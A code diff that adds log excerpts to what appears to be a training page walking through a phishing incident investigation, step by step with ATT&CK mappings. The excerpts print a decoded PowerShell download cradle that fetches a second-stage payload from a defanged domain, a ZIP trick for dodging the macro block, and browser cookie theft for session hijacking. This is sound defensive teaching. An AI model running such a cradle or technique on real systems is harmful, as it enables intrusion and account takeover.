@@ -41,24 +41,53 @@ import DefineTerm from "@/components/assured/DefineTerm.astro";
   <div data-step class="example-step">
     <h3>Step 1. Endpoint telemetry</h3>
     <p>EDR for laptop-finance-09 over the 72-hour window. The Outlook → winword.exe → cmd → PowerShell chain is confirmed. The encoded command decodes to a download cradle pulling a second-stage payload from invoice-records[.]com/upd. The dropped file lives at %TEMP%\upd.ps1 with SHA-256 captured. No prior PowerShell from this user account; baseline confirms abnormality.</p>
+    <pre><code>{`EDR process event, laptop-finance-09, 09:11:41 UTC
+  chain:   outlook.exe -> winword.exe -> cmd.exe -> powershell.exe
+  cmdline: powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3...
+  decoded: IEX (New-Object Net.WebClient).DownloadString('https://invoice-records[.]com/upd')
+
+File write, 09:11:44 UTC
+  path:    C:\\Users\\dlin\\AppData\\Local\\Temp\\upd.ps1
+  sha256:  captured and recorded in the case file`}</code></pre>
     <p><strong>Mapped to ATT&CK:</strong> T1566 (Phishing) → T1059.001 (PowerShell) → T1105 (Ingress Tool Transfer).</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 2. Network correlation</h3>
     <p>Proxy logs confirm the HTTPS connection to invoice-records[.]com. WHOIS shows the domain registered 4 days ago; passive DNS shows low prevalence and no prior queries from the environment. Firewall logs show outbound TLS at 09:11:43, matching the EDR network event for the PowerShell process to the second. Self-signed certificate with generic CN. The destination IP is in a hosting provider's bulletproof range.</p>
+    <pre><code>{`09:11:43  laptop-finance-09  dlin  CONNECT invoice-records[.]com:443  allowed  bytes_in=18432
+09:11:57  laptop-finance-09  dlin  CONNECT invoice-records[.]com:443  allowed  bytes_in=1102
+09:12:29  laptop-finance-09  dlin  CONNECT invoice-records[.]com:443  allowed  bytes_in=1088
+
+whois:       domain created 4 days before the alert
+passive DNS: zero prior resolutions from this environment`}</code></pre>
     <p><strong>Mapped to ATT&CK:</strong> T1071.001 (Application Layer Protocol: Web Protocols).</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 3. Identity logs</h3>
     <p>dlin's authentication history over the window: normal corporate-network logins, no anomalous geographies, no MFA bypass. However: EDR file-access telemetry shows the PowerShell agent reading the browser's cookie store at 09:19, and a federated login to the cloud finance platform follows at 09:23. The session rode dlin's existing SSO state, but it is distinguishable from dlin's own morning activity: different user-agent string than dlin's browser, and no matching interactive activity (no window focus, no input events) on the laptop at that moment. That discrimination is what turns "a login happened" into evidence. The 4-week extended look at dlin's account that Scope ordered also closes here: no earlier anomalous logins, no unfamiliar consent grants, no staging activity. The extended window is recorded as checked and clean.</p>
+    <pre><code>{`EDR file-access event, 09:19:12 UTC
+  process: powershell.exe (the upd.ps1 agent)
+  read:    ...\\User Data\\Default\\Network\\Cookies   (browser cookie store)
+
+Cloud finance platform, federated sign-in, 09:23:07 UTC
+  principal:  dlin          session: existing SSO state, no new MFA prompt
+  user_agent: does not match dlin's browser (compared against the morning's sign-ins)
+  laptop interactive activity at 09:23: none (no window focus, no input events)`}</code></pre>
     <p><strong>Mapped to ATT&CK:</strong> T1539 (Steal Web Session Cookie) → T1078.004 (Valid Accounts: Cloud Accounts).</p>
   </div>
 
   <div data-step class="example-step">
     <h3>Step 4. Mail and SaaS</h3>
     <p>Mailbox audit confirms the originating email: vendor-themed subject, a ZIP attachment carrying a macro-laden Word document (the container is how the file arrived without the Mark of the Web that would have triggered Microsoft's default macro block). Three other recipients in the finance team received the same email; two opened it. EDR on those two hosts is queried; one shows the same Outlook → winword.exe → cmd → PowerShell chain. Cloud finance platform logs (vendor-provided, requested during Scope) show no in-app activity beyond the federated login.</p>
+    <pre><code>{`Mailbox audit, message trace
+  subject:     Overdue invoice: remittance required
+  from:        accounts@invoice-records[.]com
+  attachment:  invoice.zip -> invoice.doc (macro-enabled; ZIP strips Mark of the Web)
+  recipients:  dlin + 3 finance-team members
+  opened:      dlin (09:10) and 2 of the 3 peers
+  peer EDR:    1 of the 2 shows the same winword -> cmd -> PowerShell chain`}</code></pre>
     <p><strong>Mapped to ATT&CK:</strong> T1566.001 (Spearphishing Attachment).</p>
   </div>
 
